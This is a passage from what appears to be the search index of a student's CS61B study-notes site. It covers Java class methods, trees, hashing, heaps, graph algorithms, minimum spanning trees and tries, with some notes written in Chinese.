Iterator&lt;T&gt; iterator() {\n        return new ArraySetIterator();\n    }\n\n    private class ArraySetIterator implements Iterator&lt;T&gt; {\n        ...\n    }\n}\n</code></pre> now we can use the enhanced for loop on our <code>ArraySet</code> <pre><code>public static void main(String[] args) {\n    ArraySet&lt;Integer&gt; aset = new ArraySet&lt;&gt;();\n    aset.add(5);\n    aset.add(23);\n    aset.add(42);\n\n    for (int i : aset) {\n        System.out.println(i);\n    }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#object_methods","title":"Object Methods","text":""},{"location":"cs61b%20notes/java/#string_tostring","title":"<code>String toString()</code>","text":"<p>When you run <code>System.out.println(dog)</code>, it's actually doing this: <pre><code>String s = dog.toString()\nSystem.out.println(s)\n</code></pre> Object class' <code>toString()</code> method prints the hashcode of the object. will get something like: <pre><code>ArraySet@75412c2f\n</code></pre></p> <p>ArraySet</p> <ul> <li> <p>naive string concatenation usign <code>+</code>:  creates an entirely new string since <code>String</code> is immutable</p> </li> <li> <p>using <code>StringBuilder</code>: creates a string object that is mutable <pre><code>public String toString() {\n        StringBuilder returnSB = new StringBuilder(\"{\");\n        for (int i = 0; i &lt; size - 1; i += 1) {\n            returnSB.append(items[i].toString());\n            returnSB.append(\", \");\n        }\n        returnSB.append(items[size - 1]);\n        returnSB.append(\"}\");\n        return returnSB.toString();\n    }\n</code></pre></p> </li> <li>use <code>String.join</code> method convert list of strings into a single string <pre><code>@Override\npublic String toString() {\n   List&lt;String&gt; listOfItems = new ArrayList&lt;&gt;();\n   for (T x : this) {\n       listOfItems.add(x.toString());\n   }\n   return \"{\" + String.join(\", \", listOfItems) + \"}\";\n}\n</code></pre></li> </ul>"},{"location":"cs61b%20notes/java/#boolean_equalsobject_obj","title":"<code>boolean equals(Object obj)</code>","text":"<p>Object class' <code>equals</code> method: <pre><code>public boolean equals(Object obj) {\n       return (this == obj);\n   }\n</code></pre></p> <p>ArraySet</p> <p><pre><code>@Override\npublic equals(Object o){    // the same signeture!!!\n    if (o instanceof ArraySet oas) {\n        if (this.size != oas.size) {\n            return false;\n        }\n        for (T i : this) {\n            if (!oas.contains(i)) {\n                return false\n            }\n        }\n        return true;\n    }\n    return false;   // if o is not an ArraySet\n}     \n</code></pre> the <code>instanceof</code> keyword checks the dynamic type of the object <pre><code>if (o instanceof ArraySet oas) {\n    ...\n}\n</code></pre> equivalent to  <pre><code>if (o instanceof ArraySet) {\n    ArraySet oas = (ArraySet) o;\n    ...\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#adt","title":"ADT  <p>An Abstract Data Type (ADT) is defined only by its operations, not by its implementation.  </p> <p>Some commonly used ADT's:</p> <ul> <li>Stacks: Structures that support last-in first-out retrieval of elements</li> <li><code>push(int x)</code></li> <li><code>int pop()</code> </li> <li>Lists: an ordered set of elements</li> <li><code>add(int i)</code></li> <li><code>int get(int i)</code></li> <li>Sets: an unordered set of unique elements (no repeats)</li> <li><code>add(int i)</code></li> <li><code>contains(int i)</code></li> <li>Maps: set of key/value pairs</li> <li><code>put(K key, V value)</code></li> <li><code>V get(K key)</code></li> </ul>","text":""},{"location":"cs61b%20notes/java/#disjoint_set","title":"Disjoint Set","text":""},{"location":"cs61b%20notes/java/#interface","title":"Interface","text":"<pre><code>public interface DisjointSets {\n    void connect(int p, int q);\n    boolean isConnected(int p, int q); \n}\n</code></pre>"},{"location":"cs61b%20notes/java/#implementation","title":"Implementation","text":"Implementation <code>isConnected</code> <code>connect</code> Quick Find \u0398(1) \u0398(N) Quick Union O(N) O(N) Weighted Quick Union (WQU) O(log N) O(log N) WQU with Path Compression O(\u03b1(N)) O(\u03b1(N))"},{"location":"cs61b%20notes/java/#public_class_wqudswithpathcompression_implements_disjointsets_private_int_parent_private_int_size_public_wqudswithpathcompressionint_n_parent_new_intn_size_new_intn_for_int_i_0_i_n_i_parenti_i_sizei_1_private_int_findint_p_if_p_parentp_parentp_findparentp_return_parentp_public_boolean_isconnectedint_p_int_q_return_findp_findq_public_void_connectint_p_int_q_int_rootp_findp_int_rootq_findq_if_rootp_rootq_if_sizerootp_sizerootq_parentrootp_rootq_sizerootq_sizerootp_else_parentrootq_rootp_sizerootp_sizerootq","title":"<pre><code>public class WQUDSWithPathCompression implements DisjointSets {\n    private int[] parent; \n    private int[] size;   \n\n    public WQUDSWithPathCompression(int N) {\n        parent = new int[N];\n        size = new int[N];\n        for (int i = 0; i &lt; N; i++) {\n            parent[i] = i;\n            size[i] = 1;\n        }\n    }\n\n    private int find(int p) {\n        if (p != parent[p]) {\n            parent[p] = find(parent[p]); \n        }\n        return parent[p];\n    }\n\n    public boolean isConnected(int p, int q) {\n        return find(p) == find(q);\n    }\n\n    public void connect(int p, int q) {\n        int rootP = find(p);  \n        int rootQ = find(q);  \n        if (rootP != rootQ) {\n            if (size[rootP] &lt; size[rootQ]) {\n                parent[rootP] = rootQ; \n                size[rootQ] += size[rootP]; \n            } else {\n                parent[rootQ] = rootP;\n                size[rootP] += size[rootQ];\n            }\n        }\n    }\n}\n</code></pre>","text":""},{"location":"cs61b%20notes/java/#bst","title":"BST","text":""},{"location":"cs61b%20notes/java/#operations","title":"Operations","text":"<p>Search <pre><code>static BST find(BST T, Key sk) {\n   if (T == null)\n      return null;\n   if (sk.equals(T.key))\n      return T;\n   else if (sk \u227a T.key)\n      return find(T.left, sk);\n   else\n      return find(T.right, sk);\n}\n</code></pre> Insert <pre><code>static BST insert(BST T, Key ik) {\n  if (T == null)\n    return new BST(ik);\n  if (ik \u227a T.key)\n    T.left = insert(T.left, ik);\n  else if (ik \u227b T.key)\n    T.right = insert(T.right, ik);\n  return T;\n}\n</code></pre> a rookie mistake: arm's length recursion -- not the true base case <pre><code>if (T.left == null) \n    T.left = new BST(ik);\nelse if (T.reight == null)\n    T.right = new BST(ik);\n</code></pre> the true base case: <pre><code>if (T == null)\n    return BST(ik);\n</code></pre> So sometimes, the function's job (whether return or manipulate) can be decided by the base case!</p> <p>Delete Hibbard deletion</p>"},{"location":"cs61b%20notes/java/#performance","title":"Performance","text":"<p>worst case: spindly tree \\(\\(H = O(N)\\)\\)</p>"},{"location":"cs61b%20notes/java/#as_sets_and_maps","title":"as Sets and Maps","text":"<ul> <li>as Sets: decrease the runtime of <code>contains</code> to \\(log(n)\\)</li> <li>as Maps: each node holds a <code>(key,value)</code> pair</li> </ul>"},{"location":"cs61b%20notes/java/#b-tree_spliting_tree","title":"B-Tree (Spliting Tree)","text":""},{"location":"cs61b%20notes/java/#operations_1","title":"Operations","text":"<p>B-Trees with a limit of 3 items per node are also called 2-3-4 trees or 2-4 trees (a node can have 2, 3, or 4 children). Setting a limit of 2 items per node results in a 2-3 tree.</p> <p>eg. 2-4 tree: </p> <p>Invariants:</p> <ul> <li>All leaves are the same distance from the root.</li> <li>A non-leaf node with k items must have exactly k + 1 children.</li> </ul>"},{"location":"cs61b%20notes/java/#performance_1","title":"Performance","text":"<p> \\(\\(H = \u0398(logN)\\)\\)</p>"},{"location":"cs61b%20notes/java/#red_black_tree","title":"Red Black Tree","text":""},{"location":"cs61b%20notes/java/#tree_rotation","title":"Tree Rotation","text":"<p>left rotation  - G's right child, P, merges with G, bringing its children along. - P then passes its left child to G and G goes down to the left to become P's left child. <pre><code>private Node rotateRight(Node h) {\n    // assert (h != null) &amp;&amp; isRed(h.left);\n    Node x = h.left;\n    h.left = x.right;\n    x.right = h;\n    return x;\n}\n\n// make a right-leaning link lean to the left\nprivate Node rotateLeft(Node h) {\n    // assert (h != null) &amp;&amp; isRed(h.right);\n    Node x = h.right;\n    h.right = x.left;\n    x.left = h;\n    return x;\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#llrb_tree","title":"LLRB Tree","text":"<ul> <li>Left-Leaning Red-Black trees have a 1-1 correspondence with 2-3 trees</li> <li>As for 2-3-4 trees, they maintain correspondence with standard Red-Black trees.</li> </ul>"},{"location":"cs61b%20notes/java/#performance_2","title":"Performance","text":"<p>Height is no more than \\(2 * height + 1\\) of the corresponding 2-3 tree.  so  \\(\\(H = \u0398(logN)\\)\\)</p>"},{"location":"cs61b%20notes/java/#operations_2","title":"Operations","text":"<p>Search the same as BST Insert Always insert the new node with a red link to its parent node, because in a 2-3 tree, we are always inserting by adding to a leaf node.</p> <ul> <li>If there is a right-leaning \u201c3-node\u201d, we have a Left Leaning Violation.     Rotate left the appropriate node to fix. </li> <li>If there are two consecutive left links, we have an Incorrect 4 Node Violation.     Rotate right the appropriate node to fix. </li> <li>If there are any nodes with two red children, we have a Temporary 4 Node.     Color flip the node to emulate the split operation.  <pre><code>public class RedBlackTree&lt;T extends Comparable&lt;T&gt;&gt; {\n\n    RBTreeNode&lt;T&gt; root;\n\n    static class RBTreeNode&lt;T&gt; {\n\n        final T item;\n        boolean isBlack;\n        RBTreeNode&lt;T&gt; left;\n        RBTreeNode&lt;T&gt; right;\n\n        RBTreeNode(boolean isBlack, T item, RBTreeNode&lt;T&gt; left,\n                   RBTreeNode&lt;T&gt; right) {\n            this.isBlack = isBlack;\n            this.item = item;\n            this.left = left;\n            this.right = right;\n        }\n    }\n\n    public RedBlackTree() {\n        root = null;\n    }\n\n    void flipColors(RBTreeNode&lt;T&gt; node) {\n        node.isBlack = false;\n        node.left.isBlack = true;\n        node.right.isBlack = true;\n    }\n\n    RBTreeNode&lt;T&gt; rotateRight(RBTreeNode&lt;T&gt; node) {\n        if (node.left == null) {\n            throw new IllegalArgumentException(\"no left child\");\n        }\n        RBTreeNode newRoot = node.left;\n        RBTreeNode subT = newRoot.right;\n        newRoot.right = node;\n        node.left = subT;\n        flipColors(newRoot);    // change color!!\n        return newRoot;\n    }\n\n    RBTreeNode&lt;T&gt; rotateLeft(RBTreeNode&lt;T&gt; node) {\n        if (node.right == null) {\n            throw new IllegalArgumentException(\"no right child\");\n        }\n        node.isBlack = false;\n        RBTreeNode newRoot = node.right;\n        newRoot.isBlack = false;    // red!!\n        RBTreeNode subT = newRoot.left;\n        newRoot.left = node;\n        node.right = subT;\n        return newRoot;\n    }\n\n    private boolean isRed(RBTreeNode&lt;T&gt; node) {\n        return node != null &amp;&amp; !node.isBlack;\n    }\n\n    public void insert(T item) {\n        root = insert(root, item);\n        root.isBlack = true;\n    }\n\n    private RBTreeNode&lt;T&gt; insert(RBTreeNode&lt;T&gt; node, T item) {\n    /* ordinary insert */\n        if (node == null) {\n            RBTreeNode newNode = new RBTreeNode(false, item, null, null);\n            return newNode;\n        }\n\n        if (item.compareTo(node.item) &lt; 0) {\n            node.left = insert(node.left, item);\n        } else if (item.compareTo(node.item) == 0) {\n            return node;\n        } else {\n            node.right = insert(node.right, item);\n        }\n\n    /* adjust */\n        if (!isRed(node.left) &amp;&amp; isRed(node.right)) {\n            return rotateLeft(node);\n        }\n\n        if (isRed(node.left) &amp;&amp; isRed(node.left.left)) {\n            return rotateRight(node);\n        }\n\n        if (isRed(node.left) &amp;&amp; isRed(node.right)) {\n            flipColors(node);\n        }\n\n        return node; \n    }\n\n}\n</code></pre></li> </ul>"},{"location":"cs61b%20notes/java/#hashing","title":"Hashing","text":""},{"location":"cs61b%20notes/java/#motivation_--_set_map","title":"Motivation -- Set / Map","text":"<p>interface: - search (boolean contain) - insert (add / put)</p> <p>implement: |   |  search |insert| |---|---|---| |  Array | O(N)  | O(N) (search first) | |  BST |  O(N) |O(N)| |B-Tree / RBT | O(logN)|O(logN)|</p> <p>setbacks: - search tree require items to be comparable - runtime </p>"},{"location":"cs61b%20notes/java/#solution_--_categorize","title":"Solution -- Categorize","text":"<p>suppose N items and M buckets runtime (evenly distrubuted): \\(\u0398(N/M)\\) - M is contant: \\(\u0398(N)\\) - N / M is constant: \\(\u0398(1)\\)  \u221a   - load factor: Java picks 0.75</p> <p>-&gt; adjust M as N increases to maintain N / M as a constant</p>"},{"location":"cs61b%20notes/java/#categorizing_strategies","title":"Categorizing Strategies","text":""},{"location":"cs61b%20notes/java/#principle","title":"Principle","text":"<ul> <li>can apply on every item</li> <li>allow resizing</li> <li>evenly distributed</li> </ul>"},{"location":"cs61b%20notes/java/#specified_strategies","title":"Specified Strategies","text":"<p>Integers: - LSB: the last digit -&gt; the lase two digit -&gt; ... (can't apply on 1, 2...) - Modular: % m -&gt; % 2 * m -&gt; ...</p> <p>lowercase letters: - the first letter -&gt; the first two letter -&gt; ... (can't apply on \"a\") - integerization: base 26</p> <p>String: - integerization by ascii: base 126 (can't apply on Chinese...)</p>"},{"location":"cs61b%20notes/java/#general_strategy_--_hashcode","title":"General Strategy -- Hashcode","text":"<p>We want a general categorizing strategy that applies to every object. Idea: integerization -&gt; reduced to a valid index (module...)</p>"},{"location":"cs61b%20notes/java/#default_hashcode_function","title":"Default hashcode Function","text":"<p>Integer Overflow In Java, there are only finitely many integers, the largest 2,147,483,647.  If you go over this limit, you overflow, starting back over at the smallest integer, which is -2,147,483,648.</p> <p>to calculate the modulo of a negative number:  <code>Math.floorMod(x, m)</code></p> <p>default hashCode() Object method: related to the memory address</p> <p>Distribution: a good spread, since the memory address is effectively random</p> <p>Strings method: <pre><code>@Override\npublic int hashCode(String s) {\n    int intRep = 0;\n    for (int i = 0; i &lt; s.length(); i += 1) {           \n        intRep = intRep * 31;\n        intRep = intRep + s.charAt(i);\n    }\n    return intRep;\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#custom_hashcode_function","title":"Custom hashCode Function","text":"<p>hashcode() work with equals()</p> <p><pre><code>public class ColoredNumber{\n    private int num;\n    private Color color;    \n    ...\n}\n</code></pre> <pre><code>@Override\npublic boolean equals(Object o) {\n   if (o instanceof ColoredNumber otherCn) {\n       return this.num == otherCn.num;\n   }\n   return false;\n}\n</code></pre></p> <p><pre><code>int N = 20;\nHashSet&lt;ColoredNumber&gt; hs = new HashSet&lt;&gt;();\nfor (int i = 0; i &lt; N; i += 1) {\n   hs.add(new ColoredNumber(i));\n}\nColoredNumber twelve = new ColoredNumber(12);\nhs.contains(twelve); // returns ??\nhs.add(twelve); // what happens ??\n</code></pre> by default hashcode():  - (likely) find the wrong bin, return <code>false</code> \u2192 add a duplicated value - find the same bin, return <code>true</code> </p> <p>by custom hashcode(): <pre><code>@Override\nprivate int hashcode(){\n    return num;\n}\n</code></pre> return <code>true</code></p> <p>Hashing a Collection</p> <p><pre><code>@Override\npublic int hashCode() {\n   int hashCode = 1;\n   for (Object o : this) {\n       hashCode = hashCode * 31;\n       hashCode = hashCode + o.hashCode();\n    }\nreturn hashCode;\n}\n</code></pre> Hashing a Recursive Data Structure <pre><code>@Override\npublic int hashCode() {\n   if (this.value == null) {\n       return 0;\n   }\n   return  this.value.hashCode() +\n    31 * this.left.hashCode() +\n    31 * 31 * this.right.hashCode();\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#avoid_mutable_keys","title":"Avoid Mutable Keys","text":"<p><pre><code>List&lt;Integer&gt; items = new ArrayList&lt;&gt;();\nitems.add(0);\nitems.add(1);\nHashSet&lt;List&lt;Integer&gt;&gt; hs = new HashSet&lt;&gt;();\nhs.add(items);\nitems.add(7);\nSystem.out.println(hs.contains(items)); // return false!\n</code></pre> after mutating, the hashcode(work with equals()) of the key  changed</p>"},{"location":"cs61b%20notes/java/#handling_collisions","title":"handling collisions","text":"<ul> <li>External Chaining: Dynamic Array of ListsSet</li> <li>Linear Probing</li> </ul>"},{"location":"cs61b%20notes/java/#priority_queue_heap","title":"Priority Queue &amp; Heap","text":""},{"location":"cs61b%20notes/java/#pq","title":"PQ","text":"<pre><code>/** (Min) Priority Queue: Allowing tracking and removal of \n  * the smallest item in a priority queue. */\npublic interface MinPQ&lt;Item&gt; {\n    /** Adds the item to the priority queue. */\n    public void add(Item x);\n    /** Returns the smallest item in the priority queue. */\n    public Item getSmallest();\n    /** Removes the smallest item from the priority queue. */\n    public Item removeSmallest();\n    /** Returns the size of the priority queue. */\n    public int size();\n}\n</code></pre> Implements add getSmallest removeSmallest Ordered Array \\(\\theta(N)\\) \\(\\theta(1)\\) \\(\\theta(1)\\) Bushy BST \\(\\theta(logN)\\) \\(\\theta(logN)\\) \\(\\theta(logN)\\) HashTable \\(\\theta(1)\\) \\(\\theta(N)\\) \\(\\theta(N)\\) Heap \\(\\theta(logN)\\) \\(\\theta(1)\\) \\(\\theta(logN)\\)"},{"location":"cs61b%20notes/java/#heap","title":"Heap","text":"<ul> <li>complete</li> <li>min-heap property</li> </ul> <p>Array-based heaps take around \u2153rd the memory it takes to represent a heap using approach 1A (direct pointers to children)</p>"},{"location":"cs61b%20notes/java/#graph","title":"Graph","text":""},{"location":"cs61b%20notes/java/#api","title":"API","text":"<p><pre><code>public class Graph {\n  public Graph(int V):               Create empty graph with v vertices\n  public void addEdge(int v, int w): add an edge v-w\n  Iterable&lt;Integer&gt; adj(int v):      vertices adjacent to v\n  int V():                           number of vertices\n  int E():                           number of edges\n...\n</code></pre> <pre><code>public class Paths {\n    public Paths(Graph G, int s):    Find all paths from G\n    boolean hasPathTo(int v):        is there a path from s to v?\n    Iterable&lt;Integer&gt; pathTo(int v): path from s to v (if any)\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#traversal","title":"Traversal","text":""},{"location":"cs61b%20notes/java/#dfs","title":"DFS","text":"<p><pre><code>public class DepthFirstPaths {\n    private boolean[] marked;\n    private int[] edgeTo;\n    private int s;\n\n    public DepthFirstPaths(Graph G, int s) {\n        ...\n        dfs(G, s);\n    }\n    private void dfs(Graph G, int v) {\n        marked[v] = true;\n        for (int w : G.adj(v)) {\n        if (!marked[w]) {\n            edgeTo[w] = v;\n            dfs(G, w);\n        }           \n        } \n    }\n\n    public Iterable&lt;Integer&gt; pathTo(int v) {\n        if (!hasPathTo(v)) return null;\n        List&lt;Integer&gt; path = new ArrayList&lt;&gt;();\n        for (int x = v; x != s; x = edgeTo[x]) {\n        path.add(x);\n        }\n        path.add(s);\n        Collections.reverse(path);\n        return path;\n    }\n\n    public boolean hasPathTo(int v) {\n        return marked[v];\n    }\n}\n</code></pre> runtime: \\(O(V + E)\\) - Each vertex is visited at most once (O(V)). - Each edge is considered at most twice (O(E)).</p>"},{"location":"cs61b%20notes/java/#bfs","title":"BFS","text":"<pre><code>public class BreadthFirstPaths {\n  private boolean[] marked;\n  private int[] edgeTo;\n  ...\n\n  private void bfs(Graph G, int s) {\n  Queue&lt;Integer&gt; fringe = \n          new Queue&lt;Integer&gt;();\n  fringe.enqueue(s);\n  marked[s] = true;\n  while (!fringe.isEmpty()) {\n    int v = fringe.dequeue();\n    for (int w : G.adj(v)) {\n      if (!marked[w]) {\n        fringe.enqueue(w);\n        marked[w] = true;\n        edgeTo[w] = v;\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"cs61b%20notes/java/#representations","title":"Representations","text":"Adj List Adj Matrix runtime (print graph) \\(O(V + E)\\) \\(O(V^2)\\) suitable for sparse dense"},{"location":"cs61b%20notes/java/#shortest_path","title":"Shortest Path","text":"<ul> <li>unweighted: BFS</li> <li>weighted: </li> <li>no negative edge: Dijkstra Algorithm</li> <li>no negative edge: A* Algorithm</li> <li>DAG: topological</li> </ul>"},{"location":"cs61b%20notes/java/#dijkstra_algorithm","title":"Dijkstra Algorithm","text":"<ul> <li>Vertices: PQ <pre><code>def dijkstras(source):\n    PQ.add(source, 0)\n    For all other vertices, v, PQ.add(v, infinity)\n    while PQ is not empty:\n        p = PQ.removeSmallest()\n        relax(all edges from p)\n</code></pre></li> </ul> <p><pre><code>def relax(edge p, q):\n    if q is visited (i.e., q is not in PQ):\n        return\n    if distTo[p] + weight(edge) &lt; distTo[q]:\n        distTo[q] = distTo[p] + w\n        edgeTo[q] = p\n        PQ.changePriority(q, distTo[q])\n</code></pre> |   |  operations | cost per operation | total cost| |---|---|---|---| | removeSmallest  |  V | \\(O(logV)\\)| \\(O(VlogV)\\)| |relax| E| \\(O(logV)\\)| \\(O(E logV)\\)|</p>"},{"location":"cs61b%20notes/java/#question_--_negative_edge","title":"question -- negative edge","text":""},{"location":"cs61b%20notes/java/#shortest_path_algorithm_for_dags","title":"Shortest Path Algorithm for DAGs","text":"<p>Since we visit vertices in topological order, a vertex is visited only when all possible info about it has been considered.</p>"},{"location":"cs61b%20notes/java/#longest_path_algorithm_for_dags","title":"Longest Path Algorithm for DAGs","text":"<p>reduction: DAG LPT -&gt; DAG SPT</p> <p></p>"},{"location":"cs61b%20notes/java/#mst","title":"MST","text":""},{"location":"cs61b%20notes/java/#prim_algorithm","title":"Prim Algorithm","text":"<p><pre><code>def prim_mst(graph):\n    start_vertex = 0\n    mst = []\n    visited = set()\n    pq = PriorityQueue()\n    pq.put((0, start_vertex))\n    while not pq.empty():\n        weight, current_vertex = pq.get()\n        if current_vertex in visited:\n            continue\n        visited.add(current_vertex)\n        mst.append((weight, current_vertex))\n        for neighbor, weight in graph[current_vertex]:\n            if neighbor not in visited:\n                pq.put((weight, neighbor))\n\n    return mst\n</code></pre> runtime: the same as Dijkstra</p>"},{"location":"cs61b%20notes/java/#kruskal_algorithm","title":"Kruskal Algorithm","text":"<ul> <li>Vertices: Disjoint Set</li> <li>Edges: Min Heap / Ordered List</li> </ul> <p><pre><code>public class KruskalMST {\n    private List&lt;Edge&gt; mst = new ArrayList&lt;Edge&gt;();\n\n    public KruskalMST(EdgeWeightedGraph G) {\n        MinPQ&lt;Edge&gt; pq = new MinPQ&lt;Edge&gt;();\n        for (Edge e : G.edges()) {\n            pq.insert(e);\n        }   // or O(N) approach\n        WeightedQuickUnionPC uf = new WeightedQuickUnionPC(G.V());\n        while (!pq.isEmpty() &amp;&amp; mst.size() &lt; G.V() - 1) {\n            Edge e = pq.delMin();\n            int v = e.from();\n            int w = e.to();\n            if (!uf.connected(v, w)) {\n                uf.union(v, w);\n                mst.add(e); \n            } \n        } \n    } \n}\n</code></pre> |   |  operations | cost per operation | total cost| |---|---|---|---| | buildPQ | | | \\(O(E)\\)| |deleteMin (heap / ordered list)| E| \\(O(logV)\\) / \\(O(1)\\)| \\(O(E logV)\\) / \\(O(E)\\)| |union| V | \\(O(log*V)\\)|\\(O(Vlog*V)\\)| |isConnected| E|\\(O(log*V)\\)|\\(O(Elog*V)\\)|</p>"},{"location":"cs61b%20notes/java/#try","title":"Try <p>If we know that our keys all have some common special property, we can sometimes get even better implementations.</p> <p>when the keys are always ASCII characters / chars -- Simply use an array! <pre><code>public class DataIndexedCharMap&lt;V&gt; {\n   private V[] items;\n   public DataIndexedCharMap(int R) {\n       items = (V[]) new Object[R];\n   }\n   ...\n}\n</code></pre> when the keys are Strings -- use Tries <pre><code>public class TrieSet {\n    private static final int R = 128; // ASCII\n    private Node root;  // root of trie\n\n    private static class Node {\n        private boolean isKey;   \n        private DataIndexedCharMap&lt;Node&gt; next;\n\n        private Node(char c, boolean b, int R) {\n            ch = c; isKey= b;\n            next = new DataIndexedCharMap&lt;&gt;(R);\n        }\n    }\n}\n</code></pre> runtime:  - Add: \\(O(1)\\) - Contain: \\(O(1)\\)</p> <p>space:  - DataIndexedCharMap: wasteful  other implements: - list - BST - hash table</p>","text":""},{"location":"cs61b%20notes/software_engineering/","title":"Software engineering","text":""},{"location":"cs61b%20notes/software_engineering/#software_engineering","title":"Software Engineering","text":""},{"location":"cs61b%20notes/software_engineering/#complexity","title":"Complexity","text":""},{"location":"cs61b%20notes/software_engineering/#restrictions_of_engineering","title":"Restrictions of Engineering","text":"<p>In other engineering disciplines, we are subject to the laws of nature. However, in computer science,, the limitation is no longer the limit of computing power; it is from the ways that we plan and design what we build.</p> <ul> <li>An individual programmer is no longer able to effectively manage the entire software system for a large project</li> <li>Any one programmer should only need to understand a fraction of the codebase</li> </ul>"},{"location":"cs61b%20notes/software_engineering/#complexity_1","title":"Complexity","text":"<p>\u201cAnything related to the structure of a software system that makes it hard to understand and modify it\u201d - John Ousterhout, \u201cA Philosophy of Software Design\u201d</p> <p>As programs have more features and functionality, their complexity increases exponentially. eg. Consider Spotify adding a queue feature; it has to work, but it also needs to work with everything already implemented such as play/pause, search, skip, etc. </p>"},{"location":"cs61b%20notes/software_engineering/#managing_complexity","title":"Managing Complexity","text":"<ul> <li>Unavoidable (Essential) Complexity To implement certain features, that feature carries some level of inherent complexity with it</li> <li>Avoidable Complexity Complexity that we can address with our choices</li> </ul> <p>In response to avoidable complexity, we can: - Make code simpler and more obvious     - avoid edge conditions... - Modules as a means of abstraction: the ability to use a piece without understanding how it works based on some specification     - interface...</p>"},{"location":"cs61b%20notes/software_engineering/#strategic_vs_tactical_programming","title":"Strategic vs Tactical Programming","text":""},{"location":"cs61b%20notes/software_engineering/#tactical_programming","title":"Tactical Programming","text":"<p>The goal is to get something working quickly</p>"},{"location":"cs61b%20notes/software_engineering/#strategic_programming","title":"Strategic Programming","text":"<p>The goal is to write code that works elegantly - at the cost of planning time, to reduce coding time. </p> <p>Code should be: - Maintainable to fix bugs - Simple to understand - Future-proof to add new functionality</p>"},{"location":"cs61b%20notes/w1dsy2ew/","title":"W1dsy2ew","text":""},{"location":"cs61b%20notes/w1dsy2ew/#cs61b_data_structure","title":"CS61B Data Structure","text":""},{"location":"cs61b%20notes/w1dsy2ew/#lec1_hello_world_java","title":"Lec.1 Hello World Java","text":""},{"location":"cs61b%20notes/w1dsy2ew/#11_first_java_program","title":"1.1 First Java Program","text":"<ol> <li>\u5728Java\u4e2d\uff0c\u6240\u6709\u4ee3\u7801\u90fd\u4f4d\u4e8e\u7c7b (Class) \u4e2d</li> <li>main \u51fd\u6570\uff1a\u6240\u6709\u8fd0\u884c\u7684\u4ee3\u7801\u5fc5\u987b\u5728\u4e00\u4e2a\u58f0\u660e\u4e3a <code>public static void main(String[ ] args)</code> \u7684\u65b9\u6cd5\u5185</li> </ol> <pre><code>public class HelloWorld {\n    public static void main(String[] args) {\n        System.out.println(\"Hello World!\");\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#12_java","title":"1.2 \u5728Java\u4e2d\u5b9a\u4e49\u51fd\u6570","text":"<ol> <li>Java\u4e2d\u53d8\u91cf\u5fc5\u987b\u5728\u4f7f\u7528\u4e4b\u524d\u58f0\u660e\u4e14\u5177\u6709\u7279\u5b9a\u7684\u7c7b\u578b(\u4e0d\u53ef\u6539\u53d8)     \u5e76\u4e14\u4f1a\u5728\u4ee3\u7801\u8fd0\u884c\u4e4b\u524d\u8fdb\u884c\u68c0\u9a8c</li> <li>\u6240\u6709\u51fd\u6570\u90fd\u662f\u7c7b\u7684\u4e00\u90e8\u5206\uff0c\u79f0\u4e3a\u7c7b\u7684\u65b9\u6cd5 (method)</li> <li> <p>\u7528 public static \u5b9a\u4e49\u51fd\u6570, \u51fd\u6570\u9700\u8981\u8fd4\u56de\u503c\u7c7b\u578b, \u51fd\u6570\u53c2\u6570\u5fc5\u987b\u5177\u6709\u7279\u5b9a\u7c7b\u578b</p> <pre><code>public class LargerDemo {\n    public static int larger(int x, int y) {\n    /*\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662fint, \u63a5\u53d7\u4e24\u4e2aint\u7c7b\u578b\u7684\u53c2\u6570*/\n        if (x &gt; y) {\n            return x;\n        }\n        return y;\n    }\n    public static void main(String[] args) {\n        System.out.println(larger(8, 10));\n    }\n}\n</code></pre> </li> <li> <p> Java\u4e2d\u589e\u5f3a\u7684for\u5faa\u73af: Enhanced For Loop</p> </li> <li> <p>\u4e0d\u9002\u7528\u4e8e\u9700\u8981\u4fee\u6539\u96c6\u5408\u5143\u7d20\u7684\u60c5\u51b5</p> </li> <li>\u4e0d\u63d0\u4f9b\u5bf9\u5143\u7d20\u7d22\u5f15\u7684\u8bbf\u95ee</li> </ol> <pre><code>for (\u5143\u7d20\u7c7b\u578b \u53d8\u91cf\u540d : \u96c6\u5408\u6216\u6570\u7ec4) {\n    // \u4f7f\u7528\u53d8\u91cf\u540d\u8bbf\u95ee\u5f53\u524d\u904d\u5386\u5230\u7684\u5143\u7d20\n}\ne.g. \nint[] numbers = {1, 2, 3, 4, 5};\nfor (int number : numbers) {\n    System.out.println(number);\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#work_flow","title":"Work Flow","text":"<pre><code>javac HelloWorld.java\njava HelloWorld\nHello World!\n</code></pre> <ol> <li>\u8fd9\u4e0d\u662f\u8fd0\u884cJava\u4ee3\u7801\u7684\u552f\u4e00\u65b9\u5f0f\uff0c\u4f46\u6700\u5e38\u89c1</li> <li>\u5c06 <code>.java</code> \u6587\u4ef6\u4e2d\u7684\u7a0b\u5e8f\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5728Java\u4e2d\u4e3b\u8981\u6709\u4e24\u4e2a\u6b65\u9aa4\uff1a\u7f16\u8bd1\u548c\u89e3\u91ca\u6267\u884c (compilation and interpretation)</li> <li> <p>\u4f7f\u7528<code>.class</code>\u6587\u4ef6\u7684\u539f\u56e0</p> </li> <li> <p><code>.class</code>\u6587\u4ef6\u7ecf\u8fc7\u4e86\u7c7b\u578b\u68c0\u67e5\uff0c\u4f7f\u5206\u53d1\u7684(distributed)\u4ee3\u7801\u66f4\u5b89\u5168</p> </li> <li><code>.class</code>\u6587\u4ef6\u5bf9\u673a\u5668\u66f4\u6613\u6267\u884c\uff0c\u8fd0\u884c\u901f\u5ea6\u66f4\u5feb\u5e76\u80fd\u4fdd\u62a4\u6e90\u4ee3\u7801\u6587\u4ef6</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec2_defining_and_instantiating_classes","title":"Lec.2 Defining and Instantiating Classes","text":""},{"location":"cs61b%20notes/w1dsy2ew/#21_class_methods","title":"2.1 \u9759\u6001\u65b9\u6cd5/\u7c7b\u65b9\u6cd5  <code>Class Methods</code>","text":"<ol> 